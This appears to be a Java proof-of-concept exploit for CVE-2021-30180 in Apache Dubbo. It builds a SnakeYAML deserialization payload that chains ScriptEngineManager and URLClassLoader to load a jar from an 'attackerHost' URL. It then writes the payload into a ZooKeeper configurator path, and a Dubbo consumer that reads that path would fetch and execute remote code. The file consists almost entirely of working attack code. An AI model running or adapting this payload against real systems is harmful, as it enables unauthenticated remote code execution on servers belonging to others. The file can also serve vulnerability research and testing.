package org.apache.dubbo.samples.governance;

/**
 * @author Whoopsunix
 * <p>
 * CVE-2021-30180 pre-auth
 */
public class CVE_2021_30180 {
    public static void main(String[] args) throws Exception {
        /**
         * 先运行 ZKTools 初始化环境
         */
        String path = "/dubbo/config/dubbo/governance-serviceoverride-consumer.configurators";

        String attackerHost = "http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar";

        String poc = "---\n" +
                "configs:\n" +
                " - !!javax.script.ScriptEngineManager [\n" +
                "   !!java.net.URLClassLoader [[\n" +
                "     !!java.net.URL [\"" + attackerHost + "\"]\n" +
                "   ]]\n" +
                " ]";

        System.out.println(poc);

        ZKTools.initClient();
        ZKTools.addData(path, poc);
    }
}
